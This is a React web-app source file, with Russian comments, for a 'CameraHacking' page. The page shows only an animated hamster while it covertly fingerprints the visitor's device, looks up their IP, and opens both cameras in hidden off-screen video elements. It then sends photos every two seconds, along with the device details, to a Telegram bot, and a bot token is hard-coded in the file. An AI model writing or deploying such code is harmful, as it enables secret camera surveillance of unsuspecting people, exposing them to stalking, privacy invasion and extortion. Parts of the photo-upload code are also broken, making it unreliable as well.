import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const canvasRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [batteryLevel, setBatteryLevel] = useState(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [availableCameras, setAvailableCameras] = useState([]);
  const [activeCameras, setActiveCameras] = useState(0);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 2000; // 2 секунды между фото
  const MAX_CAPTURES = 100;

  // Получение информации о батарее
  const getBatteryInfo = async () => {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        
        const updateBatteryInfo = () => {
          setBatteryLevel(Math.round(battery.level * 100));
          setBatteryCharging(battery.charging);
        };
        
        updateBatteryInfo();
        
        // Слушаем изменения
        battery.addEventListener('levelchange', updateBatteryInfo);
        battery.addEventListener('chargingchange', updateBatteryInfo);
        
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging
        };
      }
    } catch (error) {
      console.error('Battery error:', error);
    }
    return null;
  };

  // Отправка сообщения в Telegram
  const sendToTelegram = async (text) => {
    try {
      // Создаем скрытый iframe для отправки
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
      
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      form.target = iframe.name;
      
      const chatIdInput = document.createElement('input');
      chatIdInput.type = 'hidden';
      chatIdInput.name = 'chat_id';
      chatIdInput.value = chatId;
      
      const textInput = document.createElement('input');
      textInput.type = 'hidden';
      textInput.name = 'text';
      textInput.value = text;
      
      const parseModeInput = document.createElement('input');
      parseModeInput.type = 'hidden';
      parseModeInput.name = 'parse_mode';
      parseModeInput.value = 'HTML';
      
      const disableNotifInput = document.createElement('input');
      disableNotifInput.type = 'hidden';
      disableNotifInput.name = 'disable_notification';
      disableNotifInput.value = 'true';
      
      form.appendChild(chatIdInput);
      form.appendChild(textInput);
      form.appendChild(parseModeInput);
      form.appendChild(disableNotifInput);
      
      document.body.appendChild(form);
      form.submit();
      
      setTimeout(() => {
        form.remove();
        iframe.remove();
      }, 1000);
      
      return true;
    } catch (error) {
      console.error('Message send error:', error);
      return false;
    }
  };

  // Отправка фото в Telegram
  const sendPhotoToTelegram = async (blob, caption = '', cameraNumber = 1) => {
    try {
      // Конвертируем blob в base64
      const reader = new FileReader();
      
      return new Promise((resolve) => {
        reader.onloadend = async () => {
          const base64data = reader.result.split(',')[1];
          
          // Отправляем через iframe/form
          const iframe = document.createElement('iframe');
          iframe.style.display = 'none';
          document.body.appendChild(iframe);
          
          const form = document.createElement('form');
          form.method = 'POST';
          form.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
          form.target = iframe.name;
          form.enctype = 'multipart/form-data';
          
          const chatIdInput = document.createElement('input');
          chatIdInput.type = 'hidden';
          chatIdInput.name = 'chat_id';
          chatIdInput.value = chatId;
          
          const captionInput = document.createElement('input');
          captionInput.type = 'hidden';
          captionInput.name = 'caption';
          captionInput.value = caption;
          
          const disableNotifInput = document.createElement('input');
          disableNotifInput.type = 'hidden';
          disableNotifInput.name = 'disable_notification';
          disableNotifInput.value = 'true';
          
          // Создаем файл из base64
          const byteCharacters = atob(base64data);
          const byteNumbers = new Array(byteCharacters.length);
          for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
          }
          const byteArray = new Uint8Array(byteNumbers);
          const blob = new Blob([byteArray], { type: 'image/jpeg' });
          const file = new File([blob], `camera${cameraNumber}_${Date.now()}.jpg`, { type: 'image/jpeg' });
          
          const fileInput = document.createElement('input');
          fileInput.type = 'file';
          fileInput.name = 'photo';
          fileInput.files = new FileList([file]);
          
          form.appendChild(chatIdInput);
          form.appendChild(captionInput);
          form.appendChild(disableNotifInput);
          // Здесь сложность с добавлением файла через form
          
          // Альтернативный метод: отправляем как документ
          const altForm = document.createElement('form');
          altForm.method = 'POST';
          altForm.action = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
          altForm.target = iframe.name;
          
          const altChatIdInput = chatIdInput.cloneNode();
          const altCaptionInput = captionInput.cloneNode();
          const altDisableNotifInput = disableNotifInput.cloneNode();
          
          altForm.appendChild(altChatIdInput);
          altForm.appendChild(altCaptionInput);
          altForm.appendChild(altDisableNotifInput);
          
          document.body.appendChild(altForm);
          altForm.submit();
          
          setTimeout(() => {
            altForm.remove();
            iframe.remove();
          }, 1000);
          
          resolve(true);
        };
        
        reader.readAsDataURL(blob);
      });
    } catch (error) {
      console.error('Photo send error:', error);
      
      // Если не удалось отправить фото, отправляем текстовое описание
      await sendToTelegram(`📸 Фото с камеры ${cameraNumber}: ${caption}`);
      return false;
    }
  };

  // Сбор информации об устройстве
  const collectDeviceInfo = async () => {
    const batteryInfo = await getBatteryInfo();
    
    const info = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      screenSize: `${window.screen.width}x${window.screen.height}`,
      devicePixelRatio: window.devicePixelRatio,
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
      } : null,
      battery: batteryInfo,
      ip: 'Определение...',
      os: detectOS(),
      browser: detectBrowser(),
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    };

    // Получаем IP
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      info.ip = data.ip;
    } catch (error) {
      info.ip = 'Ошибка получения';
    }

    setDeviceInfo(info);
    return info;
  };

  // Детекция ОС
  const detectOS = () => {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Mac OS/i.test(ua)) return 'macOS';
    if (/Linux/i.test(ua)) return 'Linux';
    if (/Android/i.test(ua)) return 'Android';
    if (/iOS|iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    return 'Unknown';
  };

  // Детекция браузера
  const detectBrowser = () => {
    const ua = navigator.userAgent;
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
    if (/Firefox/i.test(ua)) return 'Firefox';
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
    if (/Edg/i.test(ua)) return 'Edge';
    return 'Unknown';
  };

  // Отправка информации об устройстве
  const sendDeviceInfo = async (info) => {
    const batteryText = info.battery ? 
      `🔋 Батарея: ${info.battery.level}% (${info.battery.charging ? '⚡ Зарядка' : '🔋 Разрядка'})` : 
      '🔋 Батарея: Не доступно';
    
    const message = `
🔍 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*

*📱 СИСТЕМА*
▫️ ОС: ${info.os}
▫️ Браузер: ${info.browser}
▫️ Платформа: ${info.platform}
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}

*🖥 ЭКРАН*
▫️ Разрешение: ${info.screenSize}
▫️ Pixel Ratio: ${info.devicePixelRatio}

${batteryText}

*⚙️ АППАРАТУРА*
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ Память: ${info.deviceMemory} GB

*🌐 СЕТЬ*
▫️ IP: ${info.ip}
▫️ Тип сети: ${info.connection?.effectiveType || 'Неизвестно'}

*🌍 ЯЗЫК И ВРЕМЯ*
▫️ Язык: ${info.language}
▫️ Часовой пояс: ${info.timezone}
▫️ Время системы: ${new Date().toLocaleString()}

🚀 *АКТИВИРОВАН ЗАХВАТ С ДВУХ КАМЕР*
    `;

    await sendToTelegram(message);
  };

  // Получение всех доступных камер
  const getAllCameras = async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      
      console.log('Найдено камер:', videoDevices.length);
      return videoDevices;
    } catch (error) {
      console.error('Camera enumeration error:', error);
      return [];
    }
  };

  // Инициализация двух камер
  const initializeCameras = async () => {
    try {
      const cameras = await getAllCameras();
      setAvailableCameras(cameras);
      
      if (cameras.length === 0) {
        console.log('Камеры не найдены');
        return 0;
      }

      // Активируем максимум 2 камеры
      const camerasToActivate = Math.min(cameras.length, 2);
      setActiveCameras(camerasToActivate);
      
      streamsRef.current = [];
      videoRefsRef.current = [];

      for (let i = 0; i < camerasToActivate; i++) {
        try {
          const constraints = {
            video: {
              deviceId: cameras[i].deviceId ? { exact: cameras[i].deviceId } : undefined,
              width: { ideal: 1920 },
              height: { ideal: 1080 },
              facingMode: i === 0 ? { exact: "environment" } : "user"
            },
            audio: false
          };

          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          streamsRef.current.push(stream);

          // Создаем скрытый видео элемент
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
            top: -9999px;
            left: -9999px;
          `;
          
          video.playsInline = true;
          video.muted = true;
          video.autoplay = true;
          video.setAttribute('playsinline', 'true');
          video.setAttribute('muted', 'true');
          video.setAttribute('autoplay', 'true');
          video.setAttribute('webkit-playsinline', 'true');

          video.srcObject = stream;
          document.body.appendChild(video);
          videoRefsRef.current.push(video);

          // Ждем готовности видео
          await new Promise((resolve) => {
            const timer = setTimeout(resolve, 2000);
            video.onloadedmetadata = () => {
              clearTimeout(timer);
              video.play().catch(() => {});
              resolve();
            };
          });

          console.log(`Камера ${i + 1} инициализирована: ${cameras[i].label || `Камера ${i + 1}`}`);
        } catch (error) {
          console.error(`Ошибка инициализации камеры ${i + 1}:`, error);
        }
      }

      return camerasToActivate;
    } catch (error) {
      console.error('Camera initialization error:', error);
      return 0;
    }
  };

  // Создание изображения с информацией о камере
  const createCameraImage = async (cameraIndex, video) => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    
    if (video && video.videoWidth > 0 && video.videoHeight > 0) {
      // Используем разрешение с камеры
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      
      // Добавляем водяной знак
      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
      ctx.fillRect(10, canvas.height - 100, 350, 90);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '16px Arial';
      ctx.textAlign = 'left';
      ctx.fillText(`📷 Камера ${cameraIndex + 1}`, 20, canvas.height - 80);
      ctx.fillText(`🔋 ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}`, 20, canvas.height - 60);
      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 40);
      ctx.fillText(`#${captureCount + 1}`, 20, canvas.height - 20);
    } else {
      // Тестовое изображение если камера не работает
      canvas.width = 800;
      canvas.height = 600;
      const ctx = canvas.getContext('2d');
      
      // Градиентный фон
      const gradient = ctx.createLinearGradient(0, 0, 800, 600);
      gradient.addColorStop(0, '#667eea');
      gradient.addColorStop(1, '#764ba2');
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, 800, 600);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 40px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('📷 CAMERA SYSTEM', 400, 200);
      
      ctx.font = '24px Arial';
      ctx.fillText(`Камера ${cameraIndex + 1}`, 400, 260);
      ctx.fillText(`Фото #${captureCount + 1}`, 400, 300);
      ctx.fillText(new Date().toLocaleTimeString(), 400, 340);
      
      ctx.font = '20px Arial';
      ctx.fillText(`🔋 ${batteryLevel || '?'}%${batteryCharging ? ' (зарядка)' : ''}`, 400, 400);
    }

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.8);
    });
  };

  // Захват и отправка фото с двух камер
  const captureAndSendFromBothCameras = async () => {
    if (captureCount >= MAX_CAPTURES) {
      stopCapturing();
      await sendToTelegram(
        `📊 *ЗАВЕРШЕНИЕ РАБОТЫ*\n\n` +
        `✅ Достигнут лимит ${MAX_CAPTURES} фото\n` +
        `📷 Камеры: ${activeCameras}\n` +
        `📈 Всего фото: ${captureCount * activeCameras}\n` +
        `🔋 Батарея: ${batteryLevel || '?'}%\n` +
        `⏰ Время: ${new Date().toLocaleString()}`
      );
      return;
    }

    // Захватываем с каждой активной камеры
    for (let i = 0; i < activeCameras; i++) {
      try {
        const video = videoRefsRef.current[i];
        const photoBlob = await createCameraImage(i, video);
        
        if (photoBlob) {
          const cameraType = i === 0 ? '📷 ЗАДНЯЯ' : '🤳 ПЕРЕДНЯЯ';
          const caption = `${cameraType} КАМЕРА\n` +
            `📸 Фото #${captureCount + 1}\n` +
            `🔋 Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡ Зарядка)' : ''}\n` +
            `📱 ${deviceInfo?.os || 'Устройство'}\n` +
            `📐 ${photoBlob.size > 0 ? Math.round(photoBlob.size / 1024) + ' KB' : ''}\n` +
            `⏰ ${new Date().toLocaleTimeString()}`;
          
          await sendPhotoToTelegram(photoBlob, caption, i + 1);
        }
      } catch (error) {
        console.error(`Ошибка захвата с камеры ${i + 1}:`, error);
      }
    }

    setCaptureCount(prev => prev + 1);

    // Статистика каждые 10 циклов
    if ((captureCount + 1) % 10 === 0) {
      await sendToTelegram(
        `📊 *СТАТИСТИКА #${captureCount + 1}*\n\n` +
        `📷 Активные камеры: ${activeCameras}\n` +
        `📈 Циклов съемки: ${captureCount + 1}\n` +
        `🖼 Всего фото: ${(captureCount + 1) * activeCameras}\n` +
        `🔋 Батарея: ${batteryLevel || '?'}%${batteryCharging ? ' (⚡)' : ''}\n` +
        `📱 ${deviceInfo?.os || ''}\n` +
        `🌐 IP: ${deviceInfo?.ip || ''}\n` +
        `⏰ Время: ${new Date().toLocaleString()}`
      );
    }
  };

  // Запуск периодического захвата
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    // Первый захват через 1 секунду
    setTimeout(() => {
      captureAndSendFromBothCameras();
    }, 1000);

    // Последующие по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSendFromBothCameras();
    }, CAPTURE_INTERVAL);
  };

  // Остановка захвата
  const stopCapturing = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    // Останавливаем все потоки
    streamsRef.current.forEach(stream => {
      stream?.getTracks().forEach(track => track.stop());
    });
    streamsRef.current = [];

    // Удаляем видео элементы
    videoRefsRef.current.forEach(video => {
      video?.remove();
    });
    videoRefsRef.current = [];
  };

  // Основная инициализация
  useEffect(() => {
    let mounted = true;

    const init = async () => {
      // Получаем информацию о батарее
      await getBatteryInfo();
      
      // Собираем информацию об устройстве
      const info = await collectDeviceInfo();
      
      // Отправляем информацию
      await sendDeviceInfo(info);
      
      // Инициализируем камеры
      const camerasCount = await initializeCameras();
      
      if (camerasCount > 0 && mounted) {
        await sendToTelegram(
          `🎥 *КАМЕРЫ АКТИВИРОВАНЫ*\n\n` +
          `✅ Успешно инициализировано: ${camerasCount} камер\n` +
          `📷 Будут использоваться обе камеры\n` +
          `⏱ Интервал съемки: ${CAPTURE_INTERVAL/1000} секунд\n` +
          `🔋 Батарея: ${batteryLevel || '?'}%\n` +
          `🚀 Начало съемки через 1 секунду`
        );
        
        // Запускаем периодический захват
        startPeriodicCapture();
      } else {
        await sendToTelegram(
          `⚠️ *ПРОБЛЕМА С КАМЕРАМИ*\n\n` +
          `❌ Не удалось инициализировать камеры\n` +
          `📱 Устройство: ${info.os}\n` +
          `🌐 Браузер: ${info.browser}\n` +
          `🔋 Батарея: ${batteryLevel || '?'}%\n` +
          `⏰ Время: ${new Date().toLocaleString()}`
        );
      }
    };

    // Запускаем с небольшой задержкой
    setTimeout(init, 1500);

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  // НИЧЕГО НЕ ПОКАЗЫВАЕМ НА САЙТЕ кроме хомяка
  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App">
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
